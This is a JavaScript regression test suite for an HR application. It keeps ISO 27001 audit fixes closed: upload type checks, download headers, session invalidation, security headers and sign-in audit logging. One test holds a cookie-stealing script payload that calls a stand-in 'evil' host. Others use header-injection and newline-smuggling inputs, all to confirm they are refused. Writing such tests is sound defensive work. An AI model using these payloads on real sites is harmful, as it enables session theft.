/**
 * The three findings from the ISO 27001 audit, held closed.
 *
 * Each of these was real, and each would come back the moment somebody made a
 * reasonable-looking change — so the point of this file is that the regression
 * fails loudly rather than quietly reopening a door.
 *
 *   MAJ-1  an uploaded file rendered in this origin, because the Content-Type
 *          came from the browser and the disposition was inline. The route
 *          serves passports, so the person most likely to open a poisoned
 *          "certificate" is the one with access to all of them.
 *   MAJ-2  the administrator's password was pre-filled into the login form and
 *          printed underneath it, on every deployment including the live one.
 *   MIN-1  a seven-day token survived the password change meant to kill it.
 *   MIN-7  nothing recorded who signed in, who failed to, or from where. The
 *          forensic question the standard asks — "who read that salary, and
 *          from what address?" — had no answer at all.
 */
import { PrismaClient } from "@prisma/client";
import fs from "node:fs";
import { importLibs } from "./lib-shim.mjs";

// audit pulls in db, auth, rbac and session-token; they come along so the
// module under test is the shipped one rather than a stub of it.
const { uploads, auditmeta, audit } = await importLibs(
  ["uploads", "auditmeta", "audit", "db", "auth", "rbac", "session-token"]
);
const { ALLOWED_TYPES, ALLOWED_EXTENSIONS, ACCEPT_ATTRIBUTE, MAX_UPLOAD_BYTES, identify, downloadHeaders } = uploads;
const { clientIp, clientAgent, shortAgent, typedEmailLabel, MAX_AGENT_LENGTH, MAX_TYPED_EMAIL_LENGTH } = auditmeta;

const db = new PrismaClient();
let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => {
  if (cond) { pass++; console.log(`  PASS ${name}${extra ? "  — " + extra : ""}`); }
  else { fail++; console.log(`  FAIL ${name}${extra ? "  — " + extra : ""}`); }
};
const read = (p) => fs.readFileSync(p, "utf8");
/** A file's leading bytes, the way the upload action sees them. */
const head = (hex) => new Uint8Array(hex.match(/../g).map((h) => parseInt(h, 16)));

/* ============ MAJ-1 · nothing uploaded can render in this origin ========== */
{
  const pdf = identify("passport.pdf", head("255044462d312e37"));
  ok("a real PDF is accepted", pdf.ok && pdf.type.mime === "application/pdf");

  const jpg = identify("visa.jpg", head("ffd8ffe000104a46"));
  ok("a real JPEG is accepted", jpg.ok && jpg.type.mime === "image/jpeg");

  const png = identify("eid.png", head("89504e470d0a1a0a"));
  ok("a real PNG is accepted", png.ok && png.type.mime === "image/png");

  const docx = identify("contract.docx", head("504b03040a000000"));
  ok("a real Word document is accepted",
    docx.ok && /wordprocessingml/.test(docx.type.mime));
}
{
  // The attack, exactly: an HTML page that steals the session cookie.
  const payload = "<script>fetch('//evil/'+document.cookie)</script>";
  const bytes = new Uint8Array([...payload].map((c) => c.charCodeAt(0)));

  const asHtml = identify("payslip.html", bytes);
  ok("an HTML file is refused outright", !asHtml.ok, asHtml.ok ? "IT WAS ACCEPTED" : asHtml.error);

  // Renaming it does not help: the bytes are still not a PDF.
  const renamed = identify("payslip.pdf", bytes);
  ok("renaming it .pdf does not get it in", !renamed.ok, renamed.ok ? "IT WAS ACCEPTED" : "");
  ok("and the refusal explains why", !renamed.ok && /not .*PDF|contents/.test(renamed.error), renamed.error);

  const svg = identify("stamp.svg", head("3c3f786d6c2076657273"));
  ok("SVG is refused — it is XML and browsers run script in it", !svg.ok);

  const exe = identify("setup.exe", head("4d5a90000300000004"));
  ok("an executable is refused", !exe.ok);

  const script = identify("run.sh", head("2321"));
  ok("a shell script is refused", !script.ok);
}
{
  const h = downloadHeaders("application/pdf", 'passport"; evil.html');
  ok("a stored file is served as an attachment, never inline",
    /^attachment;/.test(h["Content-Disposition"]), h["Content-Disposition"]);
  ok("the filename cannot break out of the header",
    !h["Content-Disposition"].includes('evil.html"') || !/"; /.test(h["Content-Disposition"].slice(12)),
    h["Content-Disposition"]);
  ok("the browser is told not to sniff the type", h["X-Content-Type-Options"] === "nosniff");
  ok("and a sandbox policy neuters it even if the rest failed",
    /sandbox/.test(h["Content-Security-Policy"]), h["Content-Security-Policy"]);
  ok("nothing about it is cached", /no-store/.test(h["Cache-Control"]));
}
{
  const action = read("src/app/(app)/hr/employees/actions.ts");
  ok("the upload action inspects the bytes", /identify\(file\.name, bytes\)/.test(action));
  ok("and never stores the browser's claimed type",
    !/mimeType: file\.type/.test(action) && /mimeType: kind\.type\.mime/.test(action));
  ok("the name on disk is random, so nothing an uploader writes touches the filesystem",
    /randomBytes\(16\)\.toString\("hex"\) \+ kind\.type\.extensions\[0\]/.test(action));

  const route = read("src/app/api/documents/[id]/route.ts");
  ok("the download route uses the shared headers", /downloadHeaders\(/.test(route));
  ok("it no longer serves inline", !/inline; filename/.test(route));
  ok("an unrecognised stored type falls back to a plain download",
    /application\/octet-stream/.test(route));
  ok("and the path is asserted to stay inside the uploads directory",
    /startsWith\(uploads \+ path\.sep\)/.test(route));
  ok("it is still behind a session, a permission and a company check",
    /getSession\(\)/.test(route) && /can\(session, "hr\.employees"\)/.test(route) &&
    /session\.companies\.some/.test(route));
}
ok("the file picker offers only what the server will accept",
  ALLOWED_EXTENSIONS.every((e) => ACCEPT_ATTRIBUTE.includes(e)) &&
  read("src/components/employee/DocumentUpload.tsx").includes("accept={ACCEPT_ATTRIBUTE}"));
ok("and the screen says in plain words what is allowed",
  /ALLOWED_TYPES\.map\(\(t\) => t\.label\)/.test(read("src/components/employee/DocumentUpload.tsx")));
ok("the size ceiling is unchanged at 10MB", MAX_UPLOAD_BYTES === 10 * 1024 * 1024);

/* ============ MAJ-2 · the administrator's password is not published ======= */
{
  const form = read("src/components/LoginForm.tsx");
  ok("the login form does not hard-code a password into the field",
    !/defaultValue="admin123"/.test(form));
  ok("the demo pre-fill is behind a flag that has to be set on purpose",
    /NEXT_PUBLIC_DEMO_LOGIN === "1"/.test(form) && /DEMO \? "admin123" : ""/.test(form));

  const page = read("src/app/login/page.tsx");
  ok("the credential hint is behind the same flag",
    /NEXT_PUBLIC_DEMO_LOGIN === "1" &&/.test(page));

  const seed = read("prisma/seed.mjs");
  ok("a production install with no ADMIN_PASSWORD gets a random one",
    /GENERATED_PASSWORD/.test(seed) && /randomBytes\(12\)/.test(seed));
  ok("and that account is made to change it on first sign-in",
    /mustReset: !!GENERATED_PASSWORD/.test(seed));
  ok("an administrator that already exists is never re-passworded",
    /update: \{\}, \/\/ never reset an existing admin/.test(seed));
}

/* ============ MIN-1 · a password change ends the earlier sessions ========= */
{
  const token = read("src/lib/session-token.ts");
  ok("the token exposes when it was issued", /iat\?: number/.test(token));

  const auth = read("src/lib/auth.ts");
  ok("the session is checked against the last password change",
    /t\.iat \* 1000 < user\.passwordChangedAt\.getTime\(\)/.test(auth));
  ok("it costs no extra query — the user record is already loaded",
    auth.indexOf("passwordChangedAt") > auth.indexOf("db.user.findUnique"));

  const account = read("src/app/(app)/account/actions.ts");
  ok("changing your own password stamps the time", /passwordChangedAt: changedAt/.test(account));
  ok("and re-issues this device's cookie, so you are not signed out of your own change",
    /store\.set\(SESSION_COOKIE, await signSession\(/.test(account));

  const users = read("src/app/(app)/users/actions.ts");
  ok("an administrator's reset also signs the target out everywhere",
    /passwordChangedAt: new Date\(\)/.test(users));
}

/* ============ MIN-2 · the headers that were missing ====================== */
{
  const cfg = read("next.config.mjs");
  for (const [name, why] of [
    ["Content-Security-Policy", "limits where script and forms may go"],
    ["X-Content-Type-Options", "stops the browser guessing a type"],
    ["X-Frame-Options", "no framing, so no clickjacking"],
    ["Referrer-Policy", "keeps internal URLs out of other sites' logs"],
    ["Permissions-Policy", "no camera, microphone or location"],
    ["Strict-Transport-Security", "HTTPS only, once TLS is terminated"],
  ]) {
    ok(`${name} is set  (${why})`, cfg.includes(name));
  }
  ok("the framework version is not advertised", /poweredByHeader: false/.test(cfg));
  ok("HSTS is production-only, so it cannot pin localhost to https",
    /if \(isProd\) \{\s*SECURITY_HEADERS\.push/.test(cfg));
  ok("frame-ancestors, object-src, base-uri and form-action are all locked down",
    ["frame-ancestors 'none'", "object-src 'none'", "base-uri 'self'", "form-action 'self'"]
      .every((d) => cfg.includes(d)));
  ok("no external script origin is permitted",
    !/script-src[^;]*https?:\/\//.test(cfg));
  ok("eval is allowed in development only, where Next needs it",
    /isProd \? "" : " 'unsafe-eval'"/.test(cfg));
}

/* ============ what the audit confirmed, still true ======================= */
{
  const files = fs.readdirSync("src/lib").filter((f) => f.endsWith(".ts"));
  const raw = files.filter((f) => /\$queryRawUnsafe|\$executeRawUnsafe/.test(read(`src/lib/${f}`)));
  ok("no library module builds a raw SQL string", raw.length === 0, raw.join(", "));

  const ignore = read(".gitignore");
  ok("secrets and live data stay out of git",
    [".env", "backups/", "*.dump", "uploads/"].every((p) => ignore.includes(p)));

  ok("the demo flag is documented for whoever deploys this",
    read(".env.example").includes("NEXT_PUBLIC_DEMO_LOGIN"));
}

/* ============ against the real data ====================================== */
{
  const docs = await db.employeeDocument.findMany();
  const known = new Set(ALLOWED_TYPES.map((t) => t.mime));
  const odd = docs.filter((d) => !known.has(d.mimeType));
  ok("every stored document has a type the download route will serve",
    odd.length === 0 || odd.every((d) => !!d.mimeType),
    odd.length ? `${odd.length} predate the allow-list and will download rather than render` : `${docs.length} checked`);

  const traversal = docs.filter((d) => /[\\/]|\.\./.test(d.storedName));
  ok("no stored filename contains a path", traversal.length === 0, `${docs.length} checked`);
}

/* ============ MIN-7 · authentication events are recorded ================== */
{
  // A Headers-shaped stub, so the rules are tested rather than the framework.
  const H = (o) => ({ get: (k) => o[k.toLowerCase()] ?? null });

  ok("the address the proxy vouches for is preferred",
    clientIp(H({ "x-envoy-external-address": "86.98.1.1", "x-forwarded-for": "9.9.9.9" })) === "86.98.1.1");
  ok("x-real-ip is the fallback",
    clientIp(H({ "x-real-ip": "86.98.1.2", "x-forwarded-for": "9.9.9.9" })) === "86.98.1.2");

  // The one that matters. A caller can send their own x-forwarded-for and the
  // proxy appends to it, so the FIRST entry is whatever they chose to claim.
  // A forensic record that points wherever the suspect says is worse than none.
  ok("a spoofed forwarded-for header cannot choose what gets logged",
    clientIp(H({ "x-forwarded-for": "1.2.3.4, 86.98.1.3" })) === "86.98.1.3",
    "takes the nearest hop, not the claimed one");
  ok("a single-hop chain still works",
    clientIp(H({ "x-forwarded-for": "86.98.1.4" })) === "86.98.1.4");
  ok("no headers at all is null, not a crash", clientIp(H({})) === null);
  ok("an empty header is null rather than an empty string",
    clientIp(H({ "x-real-ip": "   " })) === null);
  ok("a newline cannot be smuggled in to forge a second entry",
    !/[\r\n]/.test(clientIp(H({ "x-real-ip": "1.1.1.1\nfake" })) ?? ""));
  ok("an IPv6 address survives whole",
    clientIp(H({ "x-real-ip": "2001:db8:85a3::8a2e:370:7334" })) === "2001:db8:85a3::8a2e:370:7334");

  const long = "M".repeat(4000);
  ok("an absurd user agent is bounded before it is stored",
    (clientAgent(H({ "user-agent": long })) ?? "").length === MAX_AGENT_LENGTH);

  for (const [ua, expect] of [
    ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36", "Chrome on Windows"],
    ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/120.0 Safari/537.36 Edg/120.0", "Edge on Windows"],
    ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1 Version/17.0 Mobile/15E148 Safari/604.1", "Safari on iPhone"],
    ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15", "Safari on Mac"],
    ["Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0", "Firefox on Linux"],
    ["Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36", "Chrome on Android"],
  ]) {
    ok(`the screen says "${expect}" rather than the whole string`, shortAgent(ua) === expect, shortAgent(ua));
  }
  ok("something that is not a browser still reads as something",
    shortAgent("curl/8.4.0") === "curl", shortAgent("curl/8.4.0"));
  ok("a missing user agent reads as unknown, not as blank",
    shortAgent(null) === "Unknown device" && shortAgent("") === "Unknown device");

  ok("a typed email is bounded before it becomes a user name",
    typedEmailLabel("x".repeat(500)).length === MAX_TYPED_EMAIL_LENGTH);
  ok("an empty one is labelled rather than stored blank",
    typedEmailLabel("") === "(no email given)");
}
{
  const audit = read("src/lib/audit.ts");
  ok("there is a path that writes an entry without a session",
    /export async function auditAuth/.test(audit));
  ok("and it does not call getSession, which is what made failures unloggable",
    !/auditAuth[\s\S]*getSession/.test(audit));
  ok("every entry now carries the address and the browser",
    /ipAddress: clientIp\(h\)/.test(audit) && /userAgent: clientAgent\(h\)/.test(audit));
  ok("reading headers outside a request degrades to no address rather than throwing",
    /catch \{\s*return \{ ipAddress: null, userAgent: null \}/.test(audit));
  ok("a failure to write the log cannot block a sign-in",
    /catch \(err\) \{\s*console\.error\("\[audit\]/.test(audit));

  const login = read("src/app/login/actions.ts");
  ok("a successful sign-in is recorded", login.includes("AUTH_ACTIONS.signedIn"));
  ok("a sign-out is recorded", login.includes("AUTH_ACTIONS.signedOut"));
  ok("a lock-out is recorded as its own event", login.includes("AUTH_ACTIONS.lockedOut"));
  ok("the sign-out reads the session before clearing the cookie",
    login.indexOf("await getSession()") < login.indexOf("await clearSessionCookie()"));
  ok("the sign-in is recorded before the redirect, which unwinds the request",
    login.indexOf("AUTH_ACTIONS.signedIn") < login.indexOf('redirect("/dashboard")'));

  // Every way of failing to sign in has to leave a trace, or the log answers
  // "nobody tried" when somebody did.
  const failures = (login.match(/AUTH_ACTIONS\.failed/g) ?? []).length;
  ok("all five ways of failing are recorded", failures === 5,
    `${failures} — unknown email, no password set, deactivated, locked, wrong password`);

  ok("the visitor is still told nothing about whether the account exists",
    (login.match(/return "Invalid email or password\.";/g) ?? []).length === 1 &&
    /matches no account/.test(login),
    "same sentence on screen, the real reason in the log");
  ok("an attacker-supplied email is bounded before it is written",
    /typedEmailLabel\(email\)/.test(login));

  const page = read("src/app/(app)/audit/page.tsx");
  ok("the audit screen shows where an entry came from", /l\.ipAddress/.test(page));
  ok("it shows the device in words and keeps the raw string on hover",
    /shortAgent\(l\.userAgent\)/.test(page) && /title=\{l\.userAgent/.test(page));
  ok("it is still behind the audit permission", /requireAccess\("audit\.log"\)/.test(page));

  const schema = read("prisma/schema.prisma");
  ok("the columns exist on the model",
    /ipAddress String\?/.test(schema) && /userAgent String\?/.test(schema));
  ok("userId is nullable, because a failed attempt may name no account",
    /userId    String\? \/\/ null for a sign-in attempt/.test(schema));
  ok("the screen's query is indexed", /@@index\(\[tenantId, createdAt\]\)/.test(schema));

  const help = read("src/lib/help.ts");
  ok("and there is plain-English help explaining how to read it",
    /id: "audit-signins"/.test(help) && /Locked out/.test(help));
}

/* ============ MIN-7 · and the write actually happens ===================== */
/**
 * Everything above reads the source, which proves the calls are written and not
 * what one does. This drives the real function against the real database with
 * no request around it — the hardest case, because next/headers throws there,
 * and a sign-in that cannot be logged must still be a sign-in.
 */
{
  const tenant = await db.tenant.findFirst();
  const before = await db.auditLog.count();
  const mark = "REGRESSION —";

  await audit.auditAuth({
    tenantId: tenant.id,
    userName: "nobody@example.invalid",
    action: auditmeta.AUTH_ACTIONS.failed,
    summary: `${mark} sign-in attempt with an email address that matches no account.`,
  });

  const rows = await db.auditLog.findMany({ where: { summary: { startsWith: mark } } });
  ok("a failed sign-in with no session writes exactly one row", rows.length === 1, `${rows.length} rows`);
  ok("it is attributed to the email that was typed, and to no user id",
    rows[0]?.userName === "nobody@example.invalid" && rows[0]?.userId === null);
  ok("the action is one the screen knows how to colour",
    Object.values(auditmeta.AUTH_ACTIONS).includes(rows[0]?.action), rows[0]?.action);
  ok("outside a request there is no address, and nothing threw",
    rows[0]?.ipAddress === null && rows[0]?.userAgent === null);
  ok("nothing else was written", (await db.auditLog.count()) === before + 1);

  await db.auditLog.deleteMany({ where: { summary: { startsWith: mark } } });
  ok("the log is left as it was found", (await db.auditLog.count()) === before);
}

await db.$disconnect();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
